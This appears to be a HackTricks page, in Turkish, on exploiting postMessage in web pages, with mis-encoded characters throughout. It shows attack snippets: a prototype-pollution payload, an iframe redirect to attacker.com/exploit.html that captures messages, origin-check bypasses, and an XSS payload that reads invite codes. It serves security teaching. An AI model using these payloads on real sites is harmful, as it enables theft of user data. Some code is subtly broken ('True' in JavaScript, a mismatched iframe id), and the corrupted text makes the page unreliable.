# PostMessage GÃ¼venlik AÃ§Ä±klarÄ±

## PostMessage GÃ¼venlik AÃ§Ä±klarÄ±

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan ileri seviyeye Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi **HackTricks'te reklamÄ±nÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** istiyorsanÄ±z [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

## WhiteIntel

<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io), **karanlÄ±k web** destekli bir arama motorudur ve ÅŸirketin veya mÃ¼ÅŸterilerinin **hÄ±rsÄ±z kÃ¶tÃ¼ amaÃ§lÄ± yazÄ±lÄ±mlar** tarafÄ±ndan **kompromize edilip edilmediÄŸini** kontrol etmek iÃ§in **Ã¼cretsiz** iÅŸlevler sunar.

WhiteIntel'in baÅŸlÄ±ca amacÄ±, bilgi Ã§alan kÃ¶tÃ¼ amaÃ§lÄ± yazÄ±lÄ±mlardan kaynaklanan hesap ele geÃ§irmeleri ve fidye saldÄ±rÄ±larÄ±yla mÃ¼cadele etmektir.

Websitesini ziyaret edebilir ve motorlarÄ±nÄ± **Ã¼cretsiz** deneyebilirsiniz:

{% embed url="https://whiteintel.io" %}

---

## **PostMessage** GÃ¶nder

**PostMessage**, bir mesaj gÃ¶ndermek iÃ§in aÅŸaÄŸÄ±daki iÅŸlevi kullanÄ±r:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
**targetOrigin**'Ä±n '\*' veya _https://company.com_ gibi bir URL olabileceÄŸini unutmayÄ±n.\
**Ä°kinci senaryoda**, **mesaj sadece o alan adÄ±na gÃ¶nderilebilir** (pencere nesnesinin kÃ¶keni farklÄ± olsa bile).\
**Joker karakteri** kullanÄ±ldÄ±ÄŸÄ±nda, **mesajlar herhangi bir alan adÄ±na gÃ¶nderilebilir** ve Pencere nesnesinin kÃ¶kenine gÃ¶nderilir.

### iframe ve wildcard hedefOrigin saldÄ±rÄ±sÄ±

[**Bu raporda**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) aÃ§Ä±klandÄ±ÄŸÄ± gibi, **X-Frame-Header** korumasÄ± olmayan bir sayfa bulursanÄ±z ve bu sayfa **duyarlÄ±** mesajlarÄ± **wildcard** (\*) kullanarak **postMessage** ile gÃ¶nderiyorsa, **iframe'Ä±n kÃ¶kenini deÄŸiÅŸtirerek** ve **duyarlÄ±** mesajÄ± size ait bir alan adÄ±na **sÄ±zdÄ±rabilirsiniz**.\
SayfanÄ±n iframelenebilmesine raÄŸmen **targetOrigin** bir URL'ye ayarlanmÄ±ÅŸ ve joker karakteri kullanÄ±lmamÄ±ÅŸsa, bu **hile iÅŸe yaramaz**.
```markup
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener sÃ¶mÃ¼rÃ¼sÃ¼

**`addEventListener`**, JS tarafÄ±ndan **`postMessage` bekleyen`** iÅŸlevi bildirmek iÃ§in kullanÄ±lan iÅŸlevdir.\
AÅŸaÄŸÄ±daki gibi bir kod kullanÄ±lacaktÄ±r:
```javascript
window.addEventListener("message", (event) => {
if (event.origin !== "http://example.org:8080")
return;

// ...
}, false);
```
### NumaralandÄ±rma

Mevcut sayfadaki olay dinleyicilerini bulmak iÃ§in ÅŸunlarÄ± yapabilirsiniz:

- JS kodunda `window.addEventListener` ve `$(window).on` (_JQuery sÃ¼rÃ¼mÃ¼_) arayÄ±n
- GeliÅŸtirici araÃ§larÄ± konsolunda ÅŸunu Ã§alÄ±ÅŸtÄ±rÄ±n: `getEventListeners(window)`

![](<../../.gitbook/assets/image (618) (1).png>)

- TarayÄ±cÄ±nÄ±n geliÅŸtirici araÃ§larÄ±nda _Ã–ÄŸeler --> Olay Dinleyicileri_ bÃ¶lÃ¼mÃ¼ne gidin

![](<../../.gitbook/assets/image (393).png>)

- [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) veya [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker) gibi bir tarayÄ±cÄ± eklentisi kullanÄ±n. Bu tarayÄ±cÄ± eklentileri tÃ¼m mesajlarÄ± yakalayacak ve size gÃ¶sterecektir.

### KÃ¶ken kontrolÃ¼ atlatmalarÄ±

- **`event.isTrusted`** Ã¶zelliÄŸi yalnÄ±zca gerÃ§ek kullanÄ±cÄ± eylemleri tarafÄ±ndan oluÅŸturulan olaylar iÃ§in `True` dÃ¶ndÃ¼rdÃ¼ÄŸÃ¼ iÃ§in gÃ¼venli kabul edilir. DoÄŸru bir ÅŸekilde uygulandÄ±ÄŸÄ±nda atlatÄ±lmasÄ± zor olmasÄ±na raÄŸmen, gÃ¼venlik kontrollerindeki Ã¶nemi dikkate deÄŸerdir.
- PostMessage olaylarÄ±nda kÃ¶ken doÄŸrulamasÄ± iÃ§in **`indexOf()`** kullanÄ±mÄ± atlatÄ±labilir olabilir. Bu zafiyeti gÃ¶steren bir Ã¶rnek:

```javascript
("https://app-sj17.marketo.com").indexOf("https://app-sj17.ma")
```
- `String.prototype.search()` yÃ¶ntemi olan **`search()`** metodu dÃ¼zenli ifadeler iÃ§in tasarlanmÄ±ÅŸ olup, dizgiler iÃ§in deÄŸil. DÃ¼zenli ifadeden baÅŸka bir ÅŸey geÃ§irilmesi durumunda, bu, yÃ¶ntemin potansiyel olarak gÃ¼vensiz olmasÄ±na neden olabilir. Ã‡Ã¼nkÃ¼ dÃ¼zenli ifadede nokta (.) joker karakter olarak iÅŸlev gÃ¶rerek Ã¶zel oluÅŸturulmuÅŸ alanlarla doÄŸrulamayÄ± atlamaya olanak tanÄ±r. Ã–rneÄŸin:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```
- **`match()`** fonksiyonu, `search()` gibi dÃ¼zenli ifadeleri iÅŸler. DÃ¼zenli ifade yanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmÄ±ÅŸsa, atlatÄ±labilir olabilir.
- `escapeHtml` fonksiyonu, karakterleri kaÃ§Ä±rarak giriÅŸleri temizlemek iÃ§in tasarlanmÄ±ÅŸtÄ±r. Ancak yeni bir kaÃ§Ä±rÄ±lmÄ±ÅŸ nesne oluÅŸturmaz, mevcut nesnenin Ã¶zelliklerini Ã¼zerine yazar. Bu davranÄ±ÅŸ istismar edilebilir. Ã–zellikle, bir nesne, kontrol edilen Ã¶zelliÄŸinin `hasOwnProperty`'yi kabul etmediÄŸi ÅŸekilde manipÃ¼le edilebilirse, `escapeHtml` beklenildiÄŸi gibi Ã§alÄ±ÅŸmayabilir. AÅŸaÄŸÄ±daki Ã¶rneklerde gÃ¶sterildiÄŸi gibi:

- Beklenen BaÅŸarÄ±sÄ±zlÄ±k:

```javascript
result = u({
message: "'\"<b>\\"
});
result.message // "&#39;&quot;&lt;b&gt;\"
```
- KaÃ§Ä±rma:

```javascript
result = u(new Error("'\"<b>\\"));
result.message; // "'"<b>\"
```

Bu zafiyet baÄŸlamÄ±nda, `File` nesnesi, salt okunur `name` Ã¶zelliÄŸi nedeniyle dikkate deÄŸer ÅŸekilde istismar edilebilir. Bu Ã¶zellik, ÅŸablonlarda kullanÄ±ldÄ±ÄŸÄ±nda, `escapeHtml` fonksiyonu tarafÄ±ndan temizlenmez ve potansiyel gÃ¼venlik risklerine yol aÃ§abilir.
- JavaScript'teki `document.domain` Ã¶zelliÄŸi, alanÄ± kÄ±saltmak iÃ§in bir betik tarafÄ±ndan ayarlanabilir, aynÄ± ana etki alanÄ± iÃ§inde daha esnek aynÄ± kÃ¶ken politikasÄ± uygulamasÄ±na olanak tanÄ±r.

### e.origin == window.origin atlatma

%%%%%% kullanarak bir web sayfasÄ±nÄ± **sandboxed iframe** iÃ§ine yerleÅŸtirirken, iframe'Ä±n kÃ¶keninin null olarak ayarlanacaÄŸÄ±nÄ± anlamak Ã¶nemlidir. Bu, **sandbox Ã¶znitelikleri** ve bunlarÄ±n gÃ¼venlik ve iÅŸlevsellik Ã¼zerindeki etkileriyle ilgilenirken Ã¶zellikle Ã¶nemlidir.

Sandbox Ã¶zniteliÄŸinde **`allow-popups`** belirterek, iframe'dan aÃ§Ä±lan herhangi bir aÃ§Ä±lÄ±r pencere, ebeveyninin sandbox kÄ±sÄ±tlamalarÄ±nÄ± devralÄ±r. Bu, aÃ§Ä±lÄ±r pencerenin kÃ¶keninin de `null` olarak ayarlandÄ±ÄŸÄ± anlamÄ±na gelir. Bu durum, aÃ§Ä±lÄ±r pencerenin kÃ¶keninin de `null` olarak ayarlandÄ±ÄŸÄ± iframe'Ä±n kÃ¶keniyle uyumlu hale getirilmesi anlamÄ±na gelir.

SonuÃ§ olarak, bu koÅŸullar altÄ±nda bir aÃ§Ä±lÄ±r pencere aÃ§Ä±ldÄ±ÄŸÄ±nda ve iframe'dan aÃ§Ä±lÄ±r pencereye **`postMessage`** kullanÄ±larak bir mesaj gÃ¶nderildiÄŸinde, hem gÃ¶nderme hem de alma uÃ§larÄ±nÄ±n kÃ¶kenleri `null` olarak ayarlanÄ±r. Bu durum, iframe'Ä±n ve aÃ§Ä±lÄ±r pencerenin `null` olan aynÄ± kÃ¶kene sahip olmasÄ± nedeniyle **`e.origin == window.origin`** ifadesinin doÄŸru deÄŸerlendirilmesine (`null == null`) yol aÃ§ar.

Daha fazla bilgi iÃ§in **okuyun**:

{% content-ref url="bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

### e.source Atlatma

MesajÄ±n, betiÄŸin dinlediÄŸi pencereden geldiÄŸini kontrol etmek mÃ¼mkÃ¼ndÃ¼r (Ã¶zellikle **TarayÄ±cÄ± uzantÄ±larÄ±ndan Gelen Ä°Ã§erik Betikleri** iÃ§in Ã¶zellikle ilginÃ§tir, mesajÄ±n aynÄ± sayfadan mÄ± gÃ¶nderildiÄŸini kontrol etmek iÃ§in):
```javascript
// If itâ€™s not, return immediately.
if( received_message.source !== window ) {
return;
}
```
**`e.source`**'un bir mesajÄ±n **iframe** oluÅŸturarak **null** olmasÄ±nÄ± saÄŸlayabilirsiniz ve **hemen silinir**.

Daha fazla bilgi iÃ§in **okuyun:**

{% content-ref url="bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

### X-Frame-Header atlatma

Bu saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtirmek iÃ§in ideal olarak **kurban web sayfasÄ±nÄ±** bir `iframe` iÃ§ine yerleÅŸtirebilirsiniz. Ancak `X-Frame-Header` gibi bazÄ± baÅŸlÄ±klar bu **davranÄ±ÅŸÄ± engelleyebilir**.\
Bu senaryolarda daha az gizli bir saldÄ±rÄ± kullanabilirsiniz. SavunmasÄ±z web uygulamasÄ±nÄ± yeni bir sekmede aÃ§abilir ve iletiÅŸim kurabilirsiniz:
```markup
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Ana sayfayÄ± engelleyerek Ã§ocuÄŸa gÃ¶nderilen mesajÄ± Ã§almak

AÅŸaÄŸÄ±daki sayfada, **ana sayfayÄ± engelleyerek** verileri gÃ¶ndermeden Ã¶nce **ana sayfayÄ± engelleyerek** ve **Ã§ocuk iframe'indeki XSS'i** kÃ¶tÃ¼ye kullanarak **alÄ±nan hassas postmessage verilerini** nasÄ±l Ã§alabileceÄŸinizi gÃ¶rebilirsiniz:

{% content-ref url="blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

### Iframe konumunu deÄŸiÅŸtirerek mesaj Ã§almak

EÄŸer X-Frame-Header olmadan bir iframe iÃ§erebilecek bir web sayfasÄ±nÄ± iframe'leyebilirseniz ve bu iframe baÅŸka bir iframe iÃ§eriyorsa, o Ã§ocuk iframe'inin konumunu deÄŸiÅŸtirebilirsiniz, bÃ¶ylece bir saldÄ±rgan, iframe'in **kÃ¶kenini** kendi tarafÄ±ndan **kontrol edilen** bir sayfaya **deÄŸiÅŸtirerek** postmessage ile gÃ¶nderilen bir mesajÄ± **Ã§alabilir**:

{% content-ref url="steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

### postMessage ile Prototype Pollution ve/veya XSS Ã§almak

`postMessage` aracÄ±lÄ±ÄŸÄ±yla gÃ¶nderilen verilerin JS tarafÄ±ndan yÃ¼rÃ¼tÃ¼ldÃ¼ÄŸÃ¼ senaryolarda, **sayfayÄ± iframe'leyebilir** ve **prototype pollution/XSS**'yi kÃ¶tÃ¼ye kullanarak **exploit** edebilirsiniz.

`postMessage` aracÄ±lÄ±ÄŸÄ±yla **Ã§ok iyi aÃ§Ä±klanan XSS Ã¶rnekleri** [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html) adresinde bulunabilir.

Bir `iframe`'e **Prototype Pollution ve ardÄ±ndan XSS**'yi kÃ¶tÃ¼ye kullanmak iÃ§in bir `postMessage` ile kÃ¶tÃ¼ye kullanÄ±m Ã¶rneÄŸi:
```html
<html>
<body>
<iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document.getElementById('iframe_victim').contentWindow.postMessage('{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\\" />"}}}','*');
document.getElementById('iframe_victim').contentWindow.postMessage(JSON.stringify("refresh"), '*');
}

setTimeout(get_code, 2000);
</script>
</body>
</html>
```
**Daha fazla bilgi iÃ§in**:

* [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/) hakkÄ±nda sayfaya baÄŸlantÄ±
* [**XSS**](../xss-cross-site-scripting/) hakkÄ±nda sayfaya baÄŸlantÄ±
* [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/#client-side-prototype-pollution-to-xss) hakkÄ±nda sayfaya baÄŸlantÄ±

## Referanslar

* [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)
* [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
* Pratik yapmak iÃ§in: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)

## WhiteIntel

<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io), ÅŸirketin veya mÃ¼ÅŸterilerinin **hÄ±rsÄ±z kÃ¶tÃ¼ amaÃ§lÄ± yazÄ±lÄ±mlar** tarafÄ±ndan **kompromize edilip edilmediÄŸini** kontrol etmek iÃ§in **Ã¼cretsiz** iÅŸlevler sunan **karanlÄ±k aÄŸ** destekli bir arama motorudur.

WhiteIntel'in baÅŸlÄ±ca amacÄ±, bilgi Ã§alan kÃ¶tÃ¼ amaÃ§lÄ± yazÄ±lÄ±mlardan kaynaklanan hesap ele geÃ§irmeleri ve fidye yazÄ±lÄ±mÄ± saldÄ±rÄ±larÄ±yla mÃ¼cadele etmektir.

Websitesini ziyaret edebilir ve motorlarÄ±nÄ± **Ã¼cretsiz** deneyebilirsiniz:

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* **ğŸ’¬ [Discord grubuna](https://discord.gg/hRep4RUj7f) katÄ±lÄ±n veya [telegram grubuna](https://t.me/peass) katÄ±lÄ±n veya** bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± gÃ¶ndererek HackTricks ve HackTricks Cloud** github depolarÄ±na PR'lar gÃ¶ndererek paylaÅŸÄ±n.

</details>
